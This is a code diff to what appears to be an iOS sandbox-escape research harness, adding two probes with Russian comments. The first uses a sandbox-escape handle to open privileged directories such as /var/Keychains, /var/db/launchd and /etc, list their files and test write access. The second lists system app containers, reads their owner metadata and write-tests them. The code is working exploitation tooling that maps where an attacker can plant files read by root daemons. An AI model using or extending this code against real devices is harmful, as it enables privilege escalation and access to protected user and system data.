@@ -46282,6 +46282,199 @@ static void p_bq102(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq103 — v264: W-проба кандидатных путей Tier-A демонов (§257-next).
+// Пересечение «привилегированный демон читает» × «мы можем писать».
+// Зонд = создать fz27_bq103_<pid>.tmp + unlink (как bq2, самозачищается).
+// Порядок: прямой opendir (может, /System-класс открыт) → escape(cls=7).
+static void p_bq103(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq103] v264: W-проба путей Tier-A демонов (§257)");
+    fsync(fileno(stderr));
+    static const char *targets[] = {
+        "/var/fseventsd",                 // fseventsd DB (root)
+        "/var/preferences",               // cfprefsd-system (root)
+        "/Library/Preferences",           // системные плысты
+        "/var/MobileAsset",               // mobileassetd (root)
+        "/var/MobileAsset/Assets",
+        "/var/db/launchd",                // launchd override-db (root!)
+        "/var/db/Override",               // defaults override db
+        "/var/mobile/Library/Preferences",// mobile-домены (базовый)
+        "/var/root/Library/Preferences",  // root-домены
+        "/var/containers/Bundle",         // Info.plists!
+        "/var/containers/Bundle/System",
+        "/var/Keychains",                 // keychain
+        "/var/db",                        // /var/db сам
+        "/var/db/mobile",                 // activation etc.
+        "/etc",
+        "/var/mobile/Library",            // базовый контроль (известен?)
+    };
+    int n_open = 0, n_write = 0;
+    for (unsigned i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
+        const char *t = targets[i];
+        // 1. прямой opendir?
+        DIR *d = opendir(t);
+        int direct = (d != NULL);
+        if (direct) closedir(d);
+        // 2. escape если прямой не дал
+        int64_t h = -1;
+        if (!direct) {
+            h = bq_custom(t, 0, grp, 7, F_DEF, 3);
+            if (h < 0) h = bq_custom(t, 1, grp, 7, F_DEF, 3);
+            d = (h >= 0) ? opendir(t) : NULL;
+        }
+        int readable = (d != NULL);
+        if (readable) {
+            // листинг первых записей (контент = подсказка владельца)
+            int cnt = 0;
+            struct dirent *e;
+            char names[256] = "";
+            while (d && (e = readdir(d)) && cnt < 5) {
+                if (e->d_name[0] == '.') continue;
+                cnt++;
+                strncat(names, e->d_name, sizeof(names) - strlen(names) - 2);
+                strncat(names, " ", sizeof(names) - strlen(names) - 1);
+            }
+            closedir(d);
+            n_open++;
+            // 3. W-зонд: create+unlink
+            char fp[600];
+            snprintf(fp, sizeof(fp), "%s/fz27_bq103_%d.tmp", t, (int)getpid());
+            int fd = open(fp, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+            if (fd >= 0) {
+                ssize_t wr = write(fd, "fz27", 4);
+                close(fd);
+                int un = unlink(fp);
+                n_write++;
+                LOG("[bq103] %-40s READ%s WRITE=OK(w=%zd,unlink=%d) содержимое: %s",
+                    t, direct ? "(прямой)" : "(escape)", wr, un, names);
+            } else {
+                LOG("[bq103] %-40s READ%s WRITE=DENIED(errno %d) содержимое: %s",
+                    t, direct ? "(прямой)" : "(escape)", errno, names);
+            }
+        } else {
+            LOG("[bq103] %-40s READ=DENIED%s", t,
+                (h >= 0) ? "(escape дал хендл, но opendir отказал)" : "");
+        }
+        if (h >= 0) bad_query_release(h);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq103] ИТОГ: readable=%d, writable=%d из %d целей", n_open, n_write,
+        (int)(sizeof(targets) / sizeof(targets[0])));
+    fsync(fileno(stderr));
+}
+
+// p_bq104 — v264: глубокая инвентаризация 23 контейнеров (§257-next).
+// (1) Рекурсивный листинг (2 уровня, кап 300 записей) — содержимое =
+//     владелец + форматы данных; (2) metadata через per-file escape
+//     (bad_query create=1, lstat-skip — dot-фитч обходится file-токеном);
+//     (3) W-зонд на корень контейнера.
+static void p_bq104(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq104] v264: глубокая инвентаризация контейнеров Data/System (§257)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq104] escape FAIL %lld", (long long)h); return; }
+    DIR *d = opendir("/var/containers/Data/System/");
+    if (!d) { bad_query_release(h); return; }
+    struct dirent *e;
+    int nc = 0, nmeta = 0, nwrite = 0;
+    while ((e = readdir(d))) {
+        if (e->d_name[0] == '.') continue;
+        nc++;
+        char root[512];
+        snprintf(root, sizeof(root), "/var/containers/Data/System/%s", e->d_name);
+        LOG("[bq104] === %s", e->d_name);
+        // --- metadata через per-file escape (create=1 — lstat-skip) ---
+        char mp[900];
+        snprintf(mp, sizeof(mp), "%s/.com.apple.mobile_container_manager.metadata.plist", root);
+        int64_t fh = bad_query(mp, 1, (char *)grp, 0);
+        if (fh >= 0) {
+            FILE *f = fopen(mp, "rb");
+            if (f) {
+                fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
+                if (sz > 0 && sz < 32768) {
+                    NSMutableData *data = [NSMutableData dataWithLength:(NSUInteger)sz];
+                    if (fread(data.mutableBytes, 1, (size_t)sz, f) == (size_t)sz) {
+                        CFPropertyListRef pl = CFPropertyListCreateWithData(
+                            NULL, (__bridge CFDataRef)data, kCFPropertyListImmutable, NULL, NULL);
+                        if (pl && CFGetTypeID(pl) == CFDictionaryGetTypeID()) {
+                            CFTypeRef v = CFDictionaryGetValue((CFDictionaryRef)pl,
+                                CFSTR("MCMMetadataIdentifier"));
+                            if (v && CFGetTypeID(v) == CFStringGetTypeID()) {
+                                char bid[192] = {0};
+                                CFStringGetCString((CFStringRef)v, bid, sizeof(bid), kCFStringEncodingUTF8);
+                                LOG("[bq104]   OWNER: %s", bid);
+                                nmeta++;
+                            }
+                        }
+                        if (pl) CFRelease(pl);
+                    }
+                }
+                fclose(f);
+            } else {
+                LOG("[bq104]   metadata: escape OK но fopen errno %d", errno);
+            }
+            bad_query_release(fh);
+        } else {
+            LOG("[bq104]   metadata per-file escape: %lld", (long long)fh);
+        }
+        // --- W-зонд на корень ---
+        char wp[960];
+        snprintf(wp, sizeof(wp), "%s/fz27_bq104_%d.tmp", root, (int)getpid());
+        int fd = open(wp, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (fd >= 0) { close(fd); unlink(wp); nwrite++;
+            LOG("[bq104]   W: OK"); }
+        else LOG("[bq104]   W: DENIED errno %d", errno);
+        // --- листинг ключевых подкаталогов ---
+        static const char *subs1[] = { "Documents", "Library", "Library/Caches",
+                                        "Library/Preferences", "Library/Application Support" };
+        for (unsigned si = 0; si < sizeof(subs1) / sizeof(subs1[0]); si++) {
+            char dp[960];
+            snprintf(dp, sizeof(dp), "%s/%s", root, subs1[si]);
+            DIR *dd = opendir(dp);
+            if (!dd) continue;
+            struct dirent *de2;
+            int cnt = 0;
+            char line[1024] = "";
+            while ((de2 = readdir(dd)) && cnt < 24) {
+                if (de2->d_name[0] == '.') continue;
+                cnt++;
+                char fs2[64] = "";
+                struct stat st = {0};
+                char fp[1100];
+                snprintf(fp, sizeof(fp), "%s/%s", dp, de2->d_name);
+                if (stat(fp, &st) == 0)
+                    snprintf(fs2, sizeof(fs2), " %llukB", (unsigned long long)(st.st_size >> 10));
+                snprintf(line + strlen(line), sizeof(line) - strlen(line),
+                         "%s%s; ", de2->d_name, fs2);
+            }
+            closedir(dd);
+            if (cnt) LOG("[bq104]   %s: %s", subs1[si], line);
+        }
+        // Library/Preferences отдельно (там плысты-кандидаты)
+        {
+            char pp[960];
+            snprintf(pp, sizeof(pp), "%s/Library/Preferences", root);
+            DIR *dd = opendir(pp);
+            if (dd) {
+                struct dirent *de2; int cnt = 0;
+                while ((de2 = readdir(dd)) && cnt < 30) {
+                    if (de2->d_name[0] == '.') continue;
+                    cnt++;
+                    LOG("[bq104]   P/%s", de2->d_name);
+                }
+                closedir(dd);
+            }
+        }
+        fsync(fileno(stderr));
+    }
+    closedir(d);
+    bad_query_release(h);
+    LOG("[bq104] ИТОГ: %d контейнеров, owners=%d, W=%d", nc, nmeta, nwrite);
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -54898,6 +55091,8 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ100")) { p_bq100(); LOG("[probe13] bq100-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ101")) { p_bq101(); LOG("[probe13] bq101-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ102")) { p_bq102(); LOG("[probe13] bq102-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ103")) { p_bq103(); LOG("[probe13] bq103-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ104")) { p_bq104(); LOG("[probe13] bq104-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
